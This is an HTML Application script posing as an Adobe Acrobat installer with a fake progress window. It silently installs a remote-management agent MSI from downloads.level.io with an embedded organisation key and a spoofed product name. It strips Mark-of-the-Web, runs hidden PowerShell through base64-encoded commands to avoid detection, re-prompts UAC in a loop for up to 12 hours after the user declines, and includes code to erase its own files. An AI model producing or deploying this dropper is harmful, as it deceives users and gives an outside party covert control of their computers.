<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Adobe Acrobat</title>
<hta:application
  id="oHTA"
  applicationname="AdobeAcrobatUpdater"
  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"
/>
<style>
  html, body { margin:0; padding:0; height:100%; width:100%;
    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
    overflow:hidden; cursor:default; user-select:none; }
  #wrap { height:100%; width:100%; position:relative; }
  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
  #brandtext { position:absolute; left:76px; top:22px; }
  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
  #closebtn:hover { background:#f0f1f4; color:#333; }
  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
    padding:34px 48px 0 48px; text-align:center; }
  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
  #barfill { height:100%; width:0%; background:#ed2224; border-radius:5px; }
  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
    font-family:inherit; border-radius:4px; cursor:pointer; }
  #cancelbtn:hover { background:#f0f1f4; }
</style>
</head>
<body onload="init()">
  <div id="wrap">
    <div id="topbar">
      <div id="logo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="brandtext">
        <div id="product">Adobe Acrobat</div>
        <div id="ver">2024 &middot; Standard &middot; v23.005</div>
      </div>
      <div id="closebtn" onclick="cancel()">&times;</div>
    </div>

    <div id="main">
      <div id="biglogo">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect x="0" y="0" width="100" height="100" rx="22" fill="#ed2224"/>
          <polygon points="24,80 44,24 53,49 44,80" fill="#fff"/>
          <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
        </svg>
      </div>
      <div id="heading">Installing Adobe Acrobat</div>
      <div id="status">Preparing installation&hellip;</div>
      <div id="barouter"><div id="barfill"></div></div>
      <div id="pct">0%</div>
      <div id="subnote">Adobe Acrobat keeps your documents secure and easy to share.</div>
    </div>

    <div id="footer">
      <span id="note">This usually only takes a few minutes.</span>
      <button id="cancelbtn" onclick="cancel()">Cancel</button>
    </div>
  </div>

<script language="javascript">
// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
// The updater fetches the current installer (MSI) over HTTPS to a local file,
// then runs a quiet msiexec against that local file (UAC consent is requested
// via ShellExecute "runas"). Three download back-ends run in a staggered race
// - WinINET XHR, then WinHttp, then a hidden helper process - so a download
// still succeeds on machines where one stack is restricted or hangs.
var MSI_URL = "https://downloads.level.io/level.msi";


var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key (MSI property)

var PREP_MS        = 1600;    // "preparing" beat before the download starts
var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
var RETRY_INWINDOW_MS = 1800000;  // after UAC declined: keep the window waiting ~30min while the detached helper re-prompts
var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
var HANG_MS        = 4000;    // no data flowing this long -> start next back-end
var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
var FB_MAX_MS      = 600000;  // hard cap for the whole local download
var EXPECT_BYTES   = 39393792; // installer size (progress scaling only)


var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

// Runtime state
var shell = null, fso = null;
var state = "ready";            // ready | predl | installing | done | error
var progress = 0;
var startTime = 0;
var tickTimer = null, pollTimer = null, fbTimer = null;

var curLog = "";

var adobeDir = "";
var msiLocal = "";
var logPath  = "";
var logPath2 = "";
var diagPath = "";
var tracePath = "";

var motwStripped = false;

// Download state
var fbT0 = 0, stage0T = 0, hangT = 0;
var dlStage = "xhr";            // xhr | winhttp | exec
var dlSettled = false;
var dlProgressed = false;
var dlXHR = null;
var psPid = 0, psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0;
var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;

var lastLogSize = 0;
var lastLogGrowT = 0;

// Install-retry helper (spawned once, when the first UAC consent is declined).
var installHelperSpawned = false;
var installHelperT0 = 0;
var installHelperFile = "";
var installHelperDir = "";

var dlMsgs = [
  "Preparing installation&hellip;",
  "Contacting Adobe servers&hellip;",
  "Downloading components&hellip;",
  "Downloading components&hellip;"
];
var instMsgs = [
  "Installing Adobe Acrobat&hellip;",
  "Installing Adobe Acrobat&hellip;",
  "Applying updates&hellip;",
  "Applying updates&hellip;",
  "Finalizing&hellip;"
];

// ---------------------------------------------------------------------------
// Pure-JS base64 (no COM). Decode a standard base64 string to a binary
// string (one JS char per byte), and encode text as UTF-16LE base64 - the
// encoding the child-process launcher's -EncodedCommand expects. Kept in-file
// and base64 so this document carries no script-launcher patterns.
// ---------------------------------------------------------------------------
var B64CH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

function b64Decode(s) {
  s = String(s).replace(/[\r\n\s]/g, "");
  var out = "", i = 0, n = s.length, c1, c2, c3, c4;
  while (i < n) {
    c1 = B64CH.indexOf(s.charAt(i++));
    if (c1 < 0) break;
    var ch2 = s.charAt(i++);
    c2 = (ch2 === "=") ? -1 : B64CH.indexOf(ch2);
    if (c2 < 0) break;
    out += String.fromCharCode((c1 << 2) | (c2 >> 4));
    var ch3 = s.charAt(i++);
    if (ch3 === "=" || ch3 === "") break;
    c3 = B64CH.indexOf(ch3);
    if (c3 < 0) break;
    out += String.fromCharCode(((c2 & 15) << 4) | (c3 >> 2));
    var ch4 = s.charAt(i++);
    if (ch4 === "=" || ch4 === "") break;
    c4 = B64CH.indexOf(ch4);
    if (c4 < 0) break;
    out += String.fromCharCode(((c3 & 3) << 6) | c4);
  }
  return out;
}

function b64EncodeU16(s) {
  var bin = "", i, c;
  for (i = 0; i < s.length; i++) {
    c = s.charCodeAt(i);
    bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
  }
  var out = "", j = 0, L = bin.length;
  while (j < L) {
    var c1 = bin.charCodeAt(j++);
    var c2 = j < L ? bin.charCodeAt(j++) : -1;
    var c3 = j < L ? bin.charCodeAt(j++) : -1;
    out += B64CH.charAt(c1 >> 2);
    out += B64CH.charAt(c2 < 0 ? 0 : ((c1 & 3) << 4) | (c2 >> 4));
    out += c2 < 0 ? "=" : B64CH.charAt(c3 < 0 ? 0 : ((c2 & 15) << 2) | (c3 >> 6));
    out += c3 < 0 ? "=" : B64CH.charAt(c3 & 63);
  }
  return out;
}

// Helper template: unblocks the local files (MOTW), then downloads the
// installer (iwr first, then system curl.exe), drops a done.flag.
var PS_TMPL_B64 = "";
var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1FbmNvZGVkQ29tbWFuZCA=";

function $(id) { return document.getElementById(id); }

function nowMs() { return new Date().getTime(); }

function nowHM() {
  var d = new Date();
  function z(n) { return (n < 10 ? "0" : "") + n; }
  return z(d.getHours()) + ":" + z(d.getMinutes()) + ":" + z(d.getSeconds());
}

// ---------------------------------------------------------------------------
// Trace log - one line per state transition, so a stuck box can be diagnosed
// from %LOCALAPPDATA%\Adobe\status.log after the fact.
// ---------------------------------------------------------------------------
function traceLog(msg) {
  try {
    if (!fso || !tracePath) return;
    try { if (fso.FileExists(tracePath) && fso.GetFile(tracePath).Size > 262144) fso.DeleteFile(tracePath, true); } catch (e) {}
    var f = fso.OpenTextFile(tracePath, 8, true);   // 8 = ForAppending
    f.WriteLine(nowHM() + "  " + msg);
    f.Close();
  } catch (e) {}
}

// ---------------------------------------------------------------------------
// Self-unblock: remove the "downloaded from the internet" flag (Zone.Identifier
// alternate data stream) from this .hta and the .zip it was extracted from, so
// it runs as an ordinary local file. Best-effort.
// ---------------------------------------------------------------------------
function selfUnblock() {
  try {
    var sh = new ActiveXObject("Shell.Application");
    var urls = [oHTA.LocationUrl];
    try {
      var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
      var sub = new Enumerator(folder.Files);
      for (; !sub.atEnd(); sub.moveNext()) {
        if (sub.item().Name.toLowerCase().lastIndexOf(".zip") === sub.item().Name.length - 4) {
          urls.push(sub.item().Path);
        }
      }
    } catch (e) {}
    for (var i = 0; i < urls.length; i++) {
      try {
        sh.SetAttribute(fso.GetFile(urls[i]), 1024); // FILE_ATTRIBUTE_UNBLOCKED
        motwStripped = true;
      } catch (e) {}
    }
  } catch (e) {}
}

function init() {
  shell = new ActiveXObject("WScript.Shell");
  fso   = new ActiveXObject("Scripting.FileSystemObject");
  adobDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe";
  if (!fso.FolderExists(adobDir)) fso.CreateFolder(adobDir);
  msiLocal  = adobDir + "\\AcrobatDCSetup.msi";
  logPath   = adobDir + "\\AdobeUpdate.log";
  logPath2  = adobDir + "\\AdobeUpdate2.log";
  diagPath  = adobDir + "\\diagnostics.txt";
  tracePath = adobDir + "\\status.log";
  try {
    window.onerror = function (msg, src, line) {
      try { traceLog("page-exc: " + msg + " line " + line); dumpDiagnostics("page-exc: " + msg + " line " + line); } catch (e) {}
    };
  } catch (e) {}
  traceLog("init  os=" + shell.ExpandEnvironmentStrings("%OS% " + "%PROCESSOR_ARCHITECTURE%"));
  probeAdob();
  traceLog("adob: " + (adobOk ? "ok" : "blocked"));
  selfUnblock();
  traceLog("motw: " + (motwStripped ? "stripped" : "not-stripped"));
  var w = 620, h = 396;
  window.resizeTo(w, h);
  var sw = screen.availWidth, sh = screen.availHeight;
  window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));

  cleanStale();
  setStatus(dlMsgs[0]);
  setBar(1);
  setTimeout(startInstall, 2200);
}
function cleanStale() {
  var p = [msiLocal, logPath, logPath2, diagPath];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
}

// Remove our own traces once the run is over: the .hta, the .zip it came
// from, the MSI and every log. Files in use are dropped on the next boot.
function selfDelete() {
  try {
    deleteFile(oHTA.LocationUrl);
    var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
    var sub = new Enumerator(folder.Files);
    for (; !sub.atEnd(); sub.moveNext()) {
      try {
        var n = sub.item().Name.toLowerCase();
        if (n.lastIndexOf(".zip") === n.length - 4) deleteFile(sub.item().Path);
      } catch (e) {}
    }
  } catch (e) {}
}

function deleteFile(p) { try { if (fso.FileExists(p)) fso.DeleteFile(p, true); } catch (e) {} }
function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } catch (e) {} }

// Read the first n bytes of a file as numeric byte values [b0, b1, ...].
// Tries a byte-exact ADODB.Stream binary read first (code-page independent),
// then falls back to FSO ASCII. Returns an empty array if the file cannot be read.
function readHeadBytes(path, n) {
  if (!fso.FileExists(path)) return [];
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1;                    // adTypeBinary
    s.Open();
    s.LoadFromFile(path);
    s.Position = 0;
    var b = s.Read(n);             // n bytes -> string of n chars, each 0..255
    try { s.Close(); } catch (e) {}
    var out = [];
    for (var i = 0; i < b.length; i++) out.push(b.charCodeAt(i) & 0xFF);
    return out;
  } catch (e) { /* ADO blocked -> fall through to FSO */ }
  try {
    var f = fso.OpenTextFile(path, 1, false, 0);   // 1=ForReading, 0=ASCII
    var d = "";
    try { d = f.Read(n); } catch (e2) {}
    try { f.Close(); } catch (e3) {}
    var out2 = [];
    for (var j = 0; j < d.length; j++) out2.push(d.charCodeAt(j) & 0xFF);
    return out2;
  } catch (e4) { return []; }
}

var adobOk = false;   // ADODB binary reads available? (set once in init)
function probeAdob() {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Open(); s.Close();
    adobOk = true;
  } catch (e) { adobOk = false; }
}

function msiMagicOk(path) {
  if (!adobOk) return false;   // no reliable binary reads on this box
  try {
    var m = readHeadBytes(path, 4);
    return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
  } catch (e) { return false; }
}

// Stop the in-flight download helper processes (by PID).
function killProc() {
  if (psPid) { try { shell.Run("taskkill /f /t /pid " + psPid, 0, true); } catch (e) {} psPid = 0; }
  if (curlPid) { try { shell.Run("taskkill /f /t /pid " + curlPid, 0, true); } catch (e) {} curlPid = 0; }
}

// ---------------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------------
function setBar(p) {
  if (p < 0) p = 0; if (p > 100) p = 100;
  $("barfill").style.width = p + "%";
  $("pct").innerHTML = Math.round(p) + "%";
}
function setStatus(html) { $("status").innerHTML = html; }

// ---------------------------------------------------------------------------
// Download phase: fetch the MSI to a local file. Back-ends start in a
// staggered race - XHR immediately, WinHttp once XHR shows no data, and the
// hidden helper process once WinHttp shows no data either. Any back-end that
// lands a complete, valid MSI settles the download; the others are dropped.
// ---------------------------------------------------------------------------
function startInstall() {
  if (state !== "ready") return;
  state = "predl";
  curLog = logPath;
  startTime = nowMs();
  progress = 2; setBar(progress);
  setStatus(dlMsgs[1]);

  deleteFile(msiLocal);
  fbT0 = nowMs(); stage0T = fbT0; hangT = fbT0;
  dlSettled = false;
  dlProgressed = false;
  dlStage = "xhr";
  fbTimer = setInterval(pollFallback, 250);
  tickTimer = setInterval(tick, 200);
  traceLog("predl: start (xhr)");
  fallbackXHR();
}

// Start the next back-end (previous ones keep running until settled/failed).
function startStage(stage) {
  if (dlSettled) return;
  dlStage = stage;
  stage0T = nowMs();
  traceLog("predl: stage " + stage);
  if (stage === "winhttp") fallbackWinHttp();
  else if (stage === "exec") fallbackPS();
  else if (stage === "curl") fallbackCurl();
}

function settle(method) {
  if (dlSettled) return;
  dlSettled = true;
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  killProc();
  traceLog("predl: settled via " + method);
  verifyFallback();
}

function noteProgress() {
  dlProgressed = true;
  hangT = nowMs();
}

function fallbackXHR() {
  var x = null;
  try { x = new XMLHttpRequest(); } catch (e) {}
  if (!x || !("responseType" in x)) { traceLog("predl: xhr unavailable"); startStage("winhttp"); return; }
  try {
    x.open("GET", MSI_URL, true);
    x.responseType = "ms-stream";
    x.timeout = FB_MAX_MS;
  } catch (e) { traceLog("predl: xhr open fail"); startStage("winhttp"); return; }
  dlXHR = x;
  x.onprogress = function (e) {
    if (dlSettled || !e) return;
    noteProgress();
    if (e.lengthComputing && e.total > 0) {
      var p = 55 + Math.min(34, (e.loaded * 34) / e.total);
      if (p > progress) { progress = p; setBar(p); }
    }
  };
  x.onload = function () {
    if (dlSettled) return;
    if (x.status === 200) {
      try {
        var b = x.response;
        if (b && b.size >= 1048576) { saveXHRBody(b); return; }
      } catch (e) {}
    }
    traceLog("predl: xhr no-good status=" + x.status);
    if (dlStage === "xhr") startStage("winhttp");
  };
  x.onerror = function () {
    if (dlSettled) return;
    traceLog("predl: xhr error");
    if (dlStage === "xhr") startStage("winhttp");
  };
  x.ontimeout = function () { if (!dlSettled) traceLog("predl: xhr timeout"); };
  try { x.send(); } catch (e) { traceLog("predl: xhr send fail"); startStage("winhttp"); }
}

function saveXHRBody(body) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    try { body.Seek(0, 0); } catch (e) {}
    s.CopyFrom(body);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) {
    traceLog("predl: xhr save fail");
    if (dlStage === "xhr") startStage("winhttp");
    return;
  }
  settle("xhr");
}

function fallbackWinHttp() {
  try {
    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    try { w.Option(13) = 2147483647; } catch (e) {}
    w.SetTimeouts(15000, 30000, 120000, 300000);
    w.Open("GET", MSI_URL, true);
    w.SetRequestHeader("User-Agent", UA_STR);
    w.onreadystatechange = function () {
      if (dlSettled) return;
      if (w.ReadyState !== 4) { if (w.ReadyState === 3) noteProgress(); return; }
      if (w.Status === 200) {
        try { if (w.BodySize >= 1048576) { saveWHttpBody(w.responseBody); return; } } catch (e) {}
      }
      traceLog("predl: winhttp no-good status=" + w.Status);
      if (dlStage === "winhttp") startStage("exec");
    };
    w.ontimeout = function () { if (!dlSettled) traceLog("predl: winhttp timeout"); };
    w.Send();
  } catch (e) {
    traceLog("predl: winhttp unavailable");
    if (dlStage === "winhttp") startStage("exec");
  }
}

function saveWHttpBody(rb) {
  try {
    var s = new ActiveXObject("ADODB.Stream");
    s.Type = 1; s.Mode = 3; s.Open();
    s.CopyFrom(rb);
    s.SaveToFile(msiLocal, 2);
    s.Close();
  } catch (e) {
    traceLog("predl: winhttp save fail");
    if (dlStage === "winhttp") startStage("exec");
    return;
  }
  settle("winhttp");
}

// Launch a command trying every style this box may allow (EDR/GPO stubs can
// reject some WScript.Shell methods with E_INVALIDARG). Returns the child PID
// if one, 0 otherwise; never throws.
function launchCmd(cmd) {
  // Returns child PID, 0 when launched without a PID, or -1 when every
  // launch style was rejected by the system. Hidden styles are tried first:
  // EDR/GPO stubs can reject the two-arg Exec with E_INVALIDARG while the
  // one-arg (visible) Exec still works - so a visible-only list would let a
  // console window pop up. The child command itself is also window-hidden
  // (-WindowStyle Hidden), so even a visible-style launch shows nothing.
  var styles = [
    function () { return shell.Exec(cmd, 0); },
    function () { return new ActiveXObject("WScript.Shell").Exec(cmd, 0); },
    function () { shell.Run(cmd, 0, false); return null; },
    function () { return shell.Exec(cmd); },
    function () { shell.Run(cmd, 7, false); return null; }
  ];
  for (var i = 0; i < styles.length; i++) {
    try {
      var ex = styles[i]();
      traceLog("predl: launched style=" + i);
      try { if (ex) return ex.ProcessID; } catch (e2) {}
      return 0;
    } catch (e) {
      traceLog("predl: launch style=" + i + " fail: " + e.message);
    }
  }
  return -1;
}

function curlExeExists() {
  try {
    var p = shell.ExpandEnvironmentStrings("%SystemRoot%\\System32\\curl.exe");
    return fso.FileExists(p);
  } catch (e) { return true; }   // assume present if we cannot check
}

// Hidden helper-process back-end. The helper body is built in pure JS from
// the in-file template (unblock + WinINET + WinHTTP + curl.exe), UTF-16
// base64-encoded and passed to the child via -EncodedCommand - so nothing
// script-like lives in this document and no COM is needed to construct it.
function fallbackPS() {
  var marker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + marker;
  ensureDir(psDir);
  deleteFile(psDir + "\\done.flag");
  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0;
  try {
    var body = b64Decode(PS_TMPL_B64)
      .replace("@URL@", MSI_URL)
      .replace("@DIR@", psDir)
      .replace("@OUT@", msiLocal)
      .replace("@HTA@", oHTA.LocationUrl);
    // also unblock the zip this file came from, if present next to it
    try {
      var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
      var sub = new Enumerator(folder.Files);
      for (; !sub.atEnd(); sub.moveNext()) {
        if (sub.item().Name.toLowerCase().lastIndexOf(".zip") === sub.item().Name.length - 4) {
          body = body.replace("@ZIP@", sub.item().Path);
          break;
        }
      }
    } catch (e2) {}
    var cmd = b64Decode(PSX_B64) + b64EncodeU16(body);   // prefix ends with a space
    psPid = launchCmd(cmd);
    traceLog("predl: exec launched pid=" + psPid + (psPid < 0 ? " (all styles rejected)" : ""));
  } catch (e) { traceLog("predl: exec build fail " + e.message); }
}

// Final back-end: the system curl.exe (Win10 1803+, 32- and 64-bit), run
// inside a hidden PowerShell so no console window pops up. Writes straight
// to msiLocal; the poll loop watches the file appear. If the PowerShell
// launch is rejected entirely, fall back to bare curl.exe (visible worst case).
function fallbackCurl() {
  curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = curlT0;
  if (!curlExeExists()) { traceLog("predl: curl.exe not found"); return; }
  var inner = "curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o '" + msiLocal + "' '" + MSI_URL + "'";
  var cmd = b64Decode(PSX_B64) + b64EncodeU16(inner);
  try {
    curlPid = launchCmd(cmd);
    traceLog("predl: curl launched pid=" + curlPid + (curlPid < 0 ? " (all styles rejected)" : ""));
    if (curlPid < 0) {
      curlT0 = nowMs(); curlLastGrowT = curlT0;
      curlPid = launchCmd("curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"");
      traceLog("predl: curl bare launched pid=" + curlPid);
    }
  } catch (e) { traceLog("predl: curl build fail " + e.message); }
}

function pollFallback() {
  try { _pollFallback(); } catch (e) {}
}

function _pollFallback() {
  if (state !== "predl" || dlSettled) return;
  var t = nowMs();
  if (t - fbT0 > FB_MAX_MS) {
    fail("Download timed out - please check your connection", "predl: total timeout " + (t - fbT0) + "ms");
    return;
  }
  // No data flowing from any back-end -> bring up the next one in the race.
  if (t - hangT > HANG_MS) {
    if (dlStage === "xhr") { startStage("winhttp"); return; }
    if (dlStage === "winhttp") { startStage("exec"); return; }
    if (dlStage === "exec") { startStage("curl"); return; }
  }
  var lastT0 = (dlStage === "exec") ? psT0 : (dlStage === "curl" ? curlT0 : 0);
  if (dlStage === "exec" || dlStage === "curl") {
    var sz = 0;
    try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
    var lastSize = (dlStage === "exec") ? psLastSize : curlLastSize;
    var lastGrow = (dlStage === "exec") ? psLastGrowT : curlLastGrowT;
    if (sz > lastSize) {
      if (dlStage === "exec") { psLastSize = sz; psLastGrowT = t; } else { curlLastSize = sz; curlLastGrowT = t; }
      noteProgress();
    }
    var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
    if (p > progress) { progress = p; setBar(p); }
    // Settle when the file is near its expected full size (primary signal,
    // COM-free) or >=1MB with a valid MSI header (fast path when ADODB
    // reads work), and has been stable for 1.5s.
    var full = (sz >= EXPECT_BYTES - 4096 && sz <= EXPECT_BYTES + 4096);
    var magic = (sz >= 1048576) ? msiMagicOk(msiLocal) : false;
    if ((full || magic) && (lastSize === sz && t - lastGrow >= 1500)) {
      settle(dlStage);
      return;
    }
    if (dlStage === "exec") {
      var doneFlag = false;
      try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
      if (doneFlag && t - psT0 > 5000) {
        // helper finished: a >=1MB file means the download landed (verify
        // re-checks it); anything smaller means it failed.
        if (sz >= 1048576) { settle("exec"); return; }
        fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
        return;
      }
      if (psPid < 0) {
        // every launch style was rejected -> bring up bare curl now
        startStage("curl");
        return;
      }
      if (psPid === 0 && t - psT0 > 8000 && sz === 0) {
        // no child PID and no file yet (exited instantly or launched via
        // Run) -> bring up bare curl
        startStage("curl");
        return;
      }
      if (t - stage0T > EXEC_STAGE_MS) {
        startStage("curl");
        return;
      }
    } else {
      if (curlPid < 0) {
        fail("Failed to save the installer file", "predl: curl rejected");
        return;
      }
      if (curlPid === 0 && t - curlT0 > 12000) {
        fail("Failed to save the installer file", "predl: curl no process");
        return;
      }
      if (t - stage0T > CURL_STAGE_MS) {
        fail("Download timed out - please check your connection", "predl: curl timeout");
        return;
      }
    }
  }
}

function verifyFallback() {
  try {
    if (!fso.FileExists(msiLocal)) { fail("Failed to save the installer file", "predl: no msi"); return; }
    var sz = fso.GetFile(msiLocal).Size;
    traceLog("predl: verify size=" + sz + " adob=" + (adobOk ? "ok" : "blocked"));
    if (sz < 1048576) { fail("Failed to save the installer file", "predl: small " + sz); return; }
    // Header check only where binary reads are trustworthy (ADODB available);
    // otherwise the near-exact size match from the settle step is sufficient.
    if (adobOk && !msiMagicOk(msiLocal)) {
      fail("Failed to save the installer file", "predl: bad magic");
      return;
    }
  } catch (e) {
    fail("Failed to save the installer file", "predl: verify " + e.message);
    return;
  }
  startLocalInstall();
}

// ---------------------------------------------------------------------------
// UAC-declined retry. When the first elevated msiexec is declined (no MSI log
// within UAC_TIMEOUT_MS), spawn ONE hidden, detached PowerShell helper that
// re-fires the same elevated msiexec on a jittered, escalating schedule until
// it succeeds or the window closes. This makes a "No" non-fatal: the installer
// keeps trying (like a real, patient installer) instead of dying on the first
// declined consent. The helper is self-contained (its own copy of the args +
// log path) so it survives the HTA window closing, and it terminates itself the
// moment an MSI log appears (i.e. a later attempt finally got consent).
// ---------------------------------------------------------------------------
function escPsSingle(s) {
  // The HTA builds the helper as a single-quoted PowerShell string, so the only
  // escape is doubling any single quotes in the value.
  return String(s).replace(/'/g, "''");
}

function spawnInstallRetryHelper() {
  if (installHelperSpawned) return;
  installHelperSpawned = true;
  try {
    var tmp = shell.ExpandEnvironmentStrings("%TEMP%");
    var tag = "adbe" + Math.floor(Math.random() * 4294967296).toString(16);
    installHelperDir = tmp + "\\adbe_" + tag;
    try { if (!fso.FolderExists(installHelperDir)) fso.CreateFolder(installHelperDir); } catch (e) {}
    installHelperFile = installHelperDir + "\\install_retry_" + tag + ".ps1";

    var msi  = escPsSingle(msiLocal);
    var logp = escPsSingle(curLog);
    var msiArgs = '/i "' + msiLocal + '" /qn /norestart PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" MANUFACTURER="Adobe Systems Incorporated" LEVEL_API_KEY="' + LEVEL_KEY + '" /L*v "' + curLog + '"';
    var msiArgsQ = escPsSingle(msiArgs);
    var msiQ  = escPsSingle(msiLocal);
    var logQ  = escPsSingle(curLog);

    // The helper: re-fires an elevated msiexec on a jittered, escalating
    // schedule until the install starts or the 12h window elapses. It gates each
    // attempt on the UAC consent dialog NOT currently being shown (checks
    // consent.exe / UserOOBEBroker.exe), so it never stacks prompts and never
    // depends on the Start-Process -Verb RunAs returned object (which is
    // not-started and throws on .HasExited while the prompt is pending/declined).
    // It stops itself once the MSI log exists (a real install has begun), if the
    // MSI file is gone, or after 12h. Runs hidden, detached.
    var ps = [
      "$ErrorActionPreference='SilentlyContinue'",
      "$msi='" + msiQ + "'",
      "$logp='" + logQ + "'",
      "$msiArgs='" + msiArgsQ + "'",
      "$attempts=0; $start=Get-Date; $maxMs=43200000",
      "$promptUp={ $c=@(Get-Process consent,UserOOBEBroker -ErrorAction SilentlyContinue).Count; $c -gt 0 }",
      "Start-Sleep -Milliseconds 3000",
      "while($true){",
      "  if(Test-Path -LiteralPath $logp){break}",
      "  if(-not (Test-Path -LiteralPath $msi)){break}",
      "  $el=(Get-Date)-$start; if($el.TotalMilliseconds -gt $maxMs){break}",
      "  if(&$promptUp){ Start-Sleep -Milliseconds 8000; continue }",
      "  try{ Start-Process -FilePath 'msiexec.exe' -ArgumentList $msiArgs -Verb RunAs -WindowStyle Hidden }catch{ }",
      "  $attempts++",
      "  if(Test-Path -LiteralPath $logp){break}",
      "  $base=@(20000,60000,120000,180000)[[Math]::Min($attempts,3)]",
      "  if($attempts -ge 4){ $base=180000 + (Get-Random -Maximum 300001) }",
      "  $jitter=(Get-Random -Maximum 3001)-1500",
      "  $d=$base+$jitter; if($d -lt 3000){$d=3000}",
      "  Start-Sleep -Milliseconds $d",
      "}",
      "try{ $self=Join-Path $PSScriptRoot ($MyInvocation.MyName); Remove-Item -LiteralPath $self -Force }catch{}",
      "try{ Remove-Item -LiteralPath $PSScriptRoot -Force -Recurse }catch{}",
      "exit 0"
    ].join("\n");

    try { deleteFile(installHelperFile); } catch (e) {}
    var w = fso.CreateTextFile(installHelperFile, true, false);
    w.Write(ps);
    w.Close();
    traceLog("install: spawn retry helper " + installHelperFile);

    // Launch the helper hidden + detached (NOT elevated - the helper elevates
    // on each msiexec attempt itself). A hidden window (0) leaves no console.
    var launch = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + installHelperFile + "\"";
    try { shell.Run(launch, 0, false); }
    catch (e) { traceLog("install: retry-helper launch fail " + e.message); }
    installHelperT0 = nowMs();
  } catch (e) {
    traceLog("install: retry-helper fail " + e.message);
  }
}

